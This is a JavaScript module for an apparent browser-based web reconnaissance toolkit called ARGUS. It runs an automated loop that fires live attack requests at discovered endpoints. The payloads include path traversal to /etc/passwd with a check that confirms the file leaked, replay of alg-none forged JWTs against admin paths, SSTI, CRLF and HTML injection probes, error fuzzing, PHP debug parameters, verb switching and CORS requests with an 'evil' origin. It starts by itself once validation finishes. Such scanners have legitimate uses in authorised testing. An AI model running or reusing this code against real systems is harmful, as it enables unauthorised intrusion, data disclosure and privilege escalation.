// language: JavaScript, file: 11_argus.js, target: modern browsers
// ARGUS -- autonomous recon agent (hypothesis loop)

(function () {
  'use strict';
  if (!window.ReconCore) return;
  var core = window.ReconCore;
  var eventBus = core.eventBus;
  var storage = core.storage;
  var scope = core.scope;
  var mods = core.modules = core.modules || {};

  // ══════════════════════════════════════════════════════════════
  // KNOWLEDGE GRAPH
  // ══════════════════════════════════════════════════════════════
  var Graph = {
    nodes: new Map(),
    edges: new Map(),

    addNode: function (id, type, data) {
      if (this.nodes.has(id)) {
        var n = this.nodes.get(id);
        Object.assign(n.data, data);
        return n;
      }
      var node = { id: id, type: type, data: data || {}, tested: {} };
      this.nodes.set(id, node);
      if (!this.edges.has(id)) this.edges.set(id, []);
      return node;
    },

    link: function (a, b, kind) {
      if (!this.edges.has(a)) this.edges.set(a, []);
      this.edges.get(a).push({ to: b, kind: kind });
    },

    byType: function (type) {
      var out = [];
      this.nodes.forEach(function (n) { if (n.type === type) out.push(n); });
      return out;
    },

    clear: function () {
      this.nodes.clear();
      this.edges.clear();
    }
  };

  // ══════════════════════════════════════════════════════════════
  // RULES
  // ══════════════════════════════════════════════════════════════
  var RULES = [
    {
      id: 'verb-switch',
      priority: 60,
      when: function (n) { return n.type === 'probe' && n.data.status === 200 && n.data.method === 'GET'; },
      produce: function (n) {
        return ['POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'].map(function (m) {
          return {
            ruleId: 'verb-switch',
            endpoint: n.data.url,
            method: m,
            priority: 60,
            reason: 'method switch on 200 endpoint: ' + m
          };
        });
      }
    },
    {
      id: 'php-debug',
      priority: 80,
      when: function (n) {
        var h = (n.data.headers || {});
        return n.type === 'probe' && /php/i.test(h['x-powered-by'] || '');
      },
      produce: function (n) {
        var params = ['debug', 'test', 'source', 'trace', '__debugger', 'XDEBUG_SESSION_START'];
        var base = n.data.url;
        var sep = base.indexOf('?') === -1 ? '?' : '&';
        return params.map(function (p) {
          return {
            ruleId: 'php-debug',
            endpoint: base + sep + p + '=1',
            method: 'GET',
            priority: 80,
            reason: 'PHP backend -- debug param: ' + p
          };
        });
      }
    },
    {
      id: 'jwt-escalate',
      priority: 95,
      when: function (n) { return n.type === 'jwt' && n.data.hasAdminRole === false && n.data.forgedNone; },
      produce: function (n) {
        var eps = Graph.byType('endpoint').filter(function (e) {
          return /admin|dashboard|manage|internal/i.test(e.data.url || '');
        });
        return eps.slice(0, 6).map(function (e) {
          return {
            ruleId: 'jwt-escalate',
            endpoint: e.data.url,
            method: 'GET',
            headers: { 'Authorization': 'Bearer ' + n.data.forgedNone },
            priority: 95,
            reason: 'replay forged admin JWT → ' + e.data.url
          };
        });
      }
    },
    {
      id: 'path-traverse',
      priority: 55,
      when: function (n) {
        return n.type === 'endpoint' && /[?&][a-z0-9_]+=/i.test(n.data.url || '');
      },
      produce: function (n) {
        var url = n.data.url;
        var params = url.match(/[?&]([a-zA-Z0-9_]+)=/g) || [];
        var out = [];
        var seen = {};
        params.slice(0, 4).forEach(function (p) {
          var name = p.slice(1, -1);
          if (seen[name]) return;
          seen[name] = true;
          out.push({
            ruleId: 'path-traverse',
            endpoint: url.replace(new RegExp('([?&]' + name + '=)[^&]*'), '$1../../../etc/passwd'),
            method: 'GET',
            priority: 55,
            reason: 'path traversal on ' + name
          });
        });
        return out;
      }
    },
    {
      id: 'reflection-probe',
      priority: 75,
      when: function (n) { return n.type === 'probe' && n.data.reflected === true; },
      produce: function (n) {
        var canary = 'rs13poc' + Math.random().toString(36).slice(2, 8);
        var variants = [
          { payload: '<b>' + canary + '</b>', kind: 'html', priority: 85 },
          { payload: '{{' + canary + '}}', kind: 'ssti', priority: 80 },
          { payload: canary + '%0d%0aX-RS-Inject: 1', kind: 'crlf', priority: 70 },
          { payload: '"' + canary + '"', kind: 'json', priority: 65 }
        ];
        return variants.map(function (v) {
          var newUrl = (n.data.url || '').replace(/([?&][a-zA-Z0-9_]+=)([^&]*)/, function (_, pre) {
            return pre + encodeURIComponent(v.payload);
          });
          return {
            ruleId: 'reflection-probe',
            endpoint: newUrl,
            method: 'GET',
            priority: v.priority,
            reason: 'reflection test -- ' + v.kind,
            marker: canary,
            markerKind: v.kind
          };
        });
      }
    },
    {
      id: 'error-fuzz',
      priority: 70,
      when: function (n) { return n.type === 'probe' && n.data.status >= 500; },
      produce: function (n) {
        var payloads = ["'", '"', '`', '[]', '{}', '{"x":', '<>', 'null', 'NaN'];
        return payloads.slice(0, 7).map(function (p) {
          return {
            ruleId: 'error-fuzz',
            endpoint: n.data.url,
            method: 'GET',
            headers: { 'X-RS-Probe': String(p).slice(0, 40) },
            priority: 70,
            reason: 'error-based fuzz: ' + JSON.stringify(p)
          };
        });
      }
    },
    {
      id: 'cors-preflight',
      priority: 88,
      when: function (n) {
        return n.type === 'cors' && /wildcard|reflect|credentials/i.test((n.data.issue || '') + ' ' + (n.data.risk || ''));
      },
      produce: function (n) {
        return [{
          ruleId: 'cors-preflight',
          endpoint: n.data.url,
          method: 'OPTIONS',
          headers: {
            'Origin': 'https://evil.rs13.test',
            'Access-Control-Request-Method': 'PUT',
            'Access-Control-Request-Headers': 'authorization,x-custom'
          },
          priority: 88,
          reason: 'CORS preflight with evil origin'
        }];
      }
    }
  ];

  // ══════════════════════════════════════════════════════════════
  // STATE
  // ══════════════════════════════════════════════════════════════
  var queue = [];
  var seenKeys = new Set();
  var running = false;
  var stats = { tried: 0, hypotheses: 0, hits: 0, cycles: 0 };
  var MAX_CYCLES = 100;
  var RATE_MS = 800;

  function candidateKey(c) {
    return c.ruleId + '|' + c.endpoint + '|' + (c.method || 'GET');
  }

  function pickNext() {
    if (!queue.length) return null;
    var bestIdx = 0;
    for (var i = 1; i < queue.length; i++) {
      if (queue[i].priority > queue[bestIdx].priority) bestIdx = i;
    }
    return queue.splice(bestIdx, 1)[0];
  }

  async function execute(candidate) {
    var t0 = Date.now();
    var result = {
      status: 0, ok: false, headers: {}, body: '', len: 0, ms: 0,
      marker: candidate.marker || null,
      markerFound: false,
      interesting: false,
      notes: []
    };

    try {
      var opts = {
        method: candidate.method || 'GET',
        credentials: 'include',
        redirect: 'manual',
        headers: Object.assign({}, candidate.headers || {})
      };
      if (candidate.body) {
        opts.body = candidate.body;
        if (!opts.headers['Content-Type']) opts.headers['Content-Type'] = 'application/json';
      }

      var r = await fetch(candidate.endpoint, opts);
      result.status = r.status;
      result.ok = r.ok;
      result.ms = Date.now() - t0;
      r.headers.forEach(function (v, k) {
        result.headers[String(k).toLowerCase()] = String(v).slice(0, 300);
      });

      var text = '';
      try { text = await r.text(); } catch (e) {}
      result.len = text.length;
      result.body = text.slice(0, 3000);

      if (candidate.marker && text.indexOf(candidate.marker) !== -1) {
        result.markerFound = true;
      }

      if (r.status >= 500) {
        result.interesting = true;
        result.notes.push('server error ' + r.status);
      }
      if (result.markerFound) {
        result.interesting = true;
        result.notes.push('marker reflected (' + candidate.markerKind + ')');
      }
      if (r.status === 200 && candidate.method !== 'GET' && /admin|internal|dashboard/i.test(candidate.endpoint)) {
        result.interesting = true;
        result.notes.push('non-GET on admin path returned 200');
      }
      var acao = result.headers['access-control-allow-origin'];
      if (acao && /evil/i.test(acao)) {
        result.interesting = true;
        result.notes.push('CORS reflected evil origin: ' + acao);
      }
      if (/stack trace|traceback|exception|on line \d+|syntax error/i.test(result.body)) {
        result.interesting = true;
        result.notes.push('stack trace disclosed');
      }
      if (/root:.*:0:0:/i.test(result.body)) {
        result.interesting = true;
        result.notes.push('LFI CONFIRMED -- /etc/passwd content visible');
      }
    } catch (e) {
      result.error = e.message;
    }

    return result;
  }

  function runRules(nodeIds) {
    var produced = 0;
    nodeIds.forEach(function (id) {
      var node = Graph.nodes.get(id);
      if (!node) return;
      RULES.forEach(function (rule) {
        if (node.tested[rule.id]) return;
        var matches = false;
        try { matches = rule.when(node); } catch (e) {}
        if (!matches) return;
        node.tested[rule.id] = { at: Date.now() };
        var candidates;
        try { candidates = rule.produce(node) || []; } catch (e) { candidates = []; }
        candidates.forEach(function (c) {
          var key = candidateKey(c);
          if (seenKeys.has(key)) return;
          seenKeys.add(key);
          queue.push(c);
          produced++;
        });
      });
    });
    stats.hypotheses += produced;
    return produced;
  }

  async function runOne() {
    var candidate = pickNext();
    if (!candidate) return null;
    stats.tried++;

    var result = await execute(candidate);

    var probeId = 'probe::' + storage.hashKey(candidate.endpoint + '::' + (candidate.method || 'GET') + '::' + candidate.ruleId);

    Graph.addNode(probeId, 'probe', {
      url: candidate.endpoint,
      method: candidate.method,
      status: result.status,
      len: result.len,
      headers: result.headers,
      interesting: result.interesting,
      notes: result.notes,
      rule: candidate.ruleId,
      reflected: result.markerFound
    });

    try {
      await storage.put('meta', {
        kind: 'argus-result',
        rule: candidate.ruleId,
        url: candidate.endpoint,
        method: candidate.method,
        status: result.status,
        interesting: result.interesting,
        notes: result.notes,
        reason: candidate.reason
      }, probeId);
    } catch (e) {}

    if (result.interesting) {
      stats.hits++;
      eventBus.emit('argus:hit', { candidate: candidate, result: result });
      try {
        await storage.put('meta', {
          kind: 'argus-hit',
          rule: candidate.ruleId,
          url: candidate.endpoint,
          method: candidate.method,
          status: result.status,
          notes: result.notes,
          reason: candidate.reason
        }, 'hit::' + probeId);
      } catch (e) {}
    }

    runRules([probeId]);
    return result;
  }

  async function loop() {
    if (running) return;
    running = true;
    eventBus.emit('argus:start', { queue: queue.length });

    while (running && queue.length && stats.cycles < MAX_CYCLES) {
      stats.cycles++;
      try { await runOne(); } catch (e) {}
      eventBus.emit('argus:tick', { stats: Object.assign({}, stats), queue: queue.length });
      await new Promise(function (r) { setTimeout(r, RATE_MS); });
    }

    running = false;
    eventBus.emit('argus:done', { stats: Object.assign({}, stats) });
  }

  async function seed() {
    var eps = await storage.getAll('endpoints');
    eps.forEach(function (e) {
      if (!e.url) return;
      var id = 'ep::' + storage.hashKey(e.url);
      Graph.addNode(id, 'endpoint', {
        url: e.url,
        type: e.type,
        score: e.interestScore
      });
    });

    var jwts = await storage.getAll('jwt');
    jwts.forEach(function (j, i) {
      var id = 'jwt::' + storage.hashKey(j.raw || String(i));
      Graph.addNode(id, 'jwt', {
        hasAdminRole: j.hasAdminRole,
        forgedNone: j.forgedNone,
        source: j.source
      });
    });

    var cors = await storage.getAll('cors');
    cors.forEach(function (c, i) {
      var id = 'cors::' + storage.hashKey((c.url || '') + '::' + i);
      Graph.addNode(id, 'cors', {
        url: c.url,
        issue: c.issue,
        risk: c.risk
      });
    });

    var meta = await storage.getAll('meta');
    meta.forEach(function (m) {
      if (m.kind === 'argus-result' || m.kind === 'endpoint-probe') {
        var id = 'probe::' + storage.hashKey(
          (m.url || '') + '::' + (m.method || 'GET') + '::' + (m.rule || 'seed')
        );
        Graph.addNode(id, 'probe', {
          url: m.url,
          method: m.method,
          status: m.status,
          interesting: m.interesting,
          notes: m.notes,
          rule: m.rule,
          reflected: m.reflected
        });
      }
    });
  }

  async function run() {
    if (running) return { ok: false, reason: 'already running' };

    queue = [];
    seenKeys = new Set();
    stats = { tried: 0, hypotheses: 0, hits: 0, cycles: 0 };
    Graph.clear();

    await seed();
    runRules(Array.from(Graph.nodes.keys()));

    if (!queue.length) {
      return { ok: false, reason: 'no hypotheses -- run فحص first' };
    }

    setTimeout(loop, 100);
    return { ok: true, hypotheses: queue.length, nodes: Graph.nodes.size };
  }

  function stop() { running = false; }

  function state() {
    return {
      running: running,
      nodes: Graph.nodes.size,
      queue: queue.length,
      stats: Object.assign({}, stats)
    };
  }

  // Auto-trigger after validators -- يمنع التكرار أثناء تشغيل سابق
  var autoTimer = null;
  eventBus.on('validators:done', function () {
    if (running) return;
    if (autoTimer) clearTimeout(autoTimer);
    autoTimer = setTimeout(function () {
      autoTimer = null;
      if (running) return;
      run().catch(function () {});
    }, 1500);
  });

  mods.argus = {
    run: run,
    stop: stop,
    state: state,
    graph: function () {
      var out = [];
      Graph.nodes.forEach(function (n) {
        out.push({ id: n.id, type: n.type, data: n.data, tested: Object.keys(n.tested) });
      });
      return out;
    },
    rules: function () {
      return RULES.map(function (r) { return { id: r.id, priority: r.priority }; });
    }
  };
  core.argus = mods.argus;

  eventBus.emit('argus:ready', { rules: RULES.length });
  if (typeof completion === 'function') completion(true);
})();